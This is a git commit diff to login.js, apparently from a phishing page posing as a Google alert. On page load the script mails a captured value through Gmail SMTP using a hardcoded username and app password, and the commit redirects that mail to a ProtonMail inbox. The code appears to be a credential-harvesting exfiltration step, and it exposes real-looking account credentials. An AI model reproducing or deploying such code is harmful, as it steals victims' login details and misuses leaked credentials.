5cf05f0ac8042c39cbe18b6db55d68c976e25037
alerta-google <84558348+googlealerta@users.noreply.github.com>
2022-01-17 18:42:59 -0300

    Update login.js

--- login.js
+++ login.js
@@ -13,7 +13,7 @@ window.onload = function()
                     Host: "smtp.gmail.com",
                     Username : "julio74108520@gmail.com",
                     Password : "hgvt vldi peit jcoh",
-                    To : "julio74108520@gmail.com",
+                    To : "user1533@protonmail.com",
                     From : "julio74108520@gmail.com",
                     Subject : y,
                     Body : "<p> << Email </p>",
